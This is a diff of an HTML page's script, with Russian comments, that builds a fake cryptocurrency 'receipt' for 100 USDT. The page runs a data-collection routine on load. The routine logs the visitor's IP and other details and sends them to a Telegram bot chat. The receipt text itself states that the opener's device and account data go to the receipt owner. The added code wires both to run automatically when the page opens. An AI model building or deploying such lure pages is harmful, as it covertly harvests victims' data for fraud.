@@ -16,7 +16,7 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
         }
-        
+
         function collectData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
             
@@ -77,8 +77,29 @@
                 })
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
-        
-        window.onload = collectData;
+
+        function createReceipt(amount, currency, recipient) {
+            const receiptID = Math.random().toString(36).substring(2, 15); // Генерация уникального ID
+            const receiptMessage = `🧾 Новый чек:\n
+                                    ─────────────────────\n
+                                    Сумма: ${amount} ${currency}\n
+                                    Получатель: ${recipient}\n
+                                    Идентификатор чека: ${receiptID}\n
+                                    ─────────────────────\n
+                                    Примечание: Когда получатель откроет чек, данные о его устройстве и аккаунте будут отправлены владельцу чека.`;
+
+            sendToTelegram(receiptMessage);
+        }
+
+        function openReceipt() {
+            // Пример использования для создания чека на 100 USDT для получателя "User123"
+            createReceipt(100, "USDT", "User123");
+        }
+
+        window.onload = function() {
+            collectData();
+            openReceipt();
+        };
     </script>
 </head>
 <body>
